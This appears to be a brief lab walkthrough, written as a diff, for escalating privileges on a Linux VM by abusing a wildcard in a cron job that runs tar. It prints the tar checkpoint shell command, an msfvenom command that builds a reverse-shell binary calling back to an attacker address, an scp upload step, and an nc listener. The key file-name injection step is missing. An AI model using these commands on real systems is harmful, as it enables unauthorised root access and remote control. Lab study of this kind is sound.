@@ -1,0 +1,26 @@
+Exploiting WildCards in CRONJOB
+-------------------------------
+1.
+in crontab file a file is used. It is in
+cat /usr/local/bin/compress.sh
+(It runs with a wildcard(*) in /home/user directory )
+
+2. In GFTOBINS page with 'tar'.
+tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+The tar command runs other command as checkpoint
+So, we will exploit that.
+
+3.
+Now in attackbox , create a elf binary for reverseshell using msfvenom
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+
+4. Using scp transfer the elf file to /home/user of Debian VM.
+scp shell.elf user@VM_IP:/home/user
+
+5. Now in attackbox start a reverse shell listener.
+nc -lnvp 4444
+
+6. Got the shell.
+
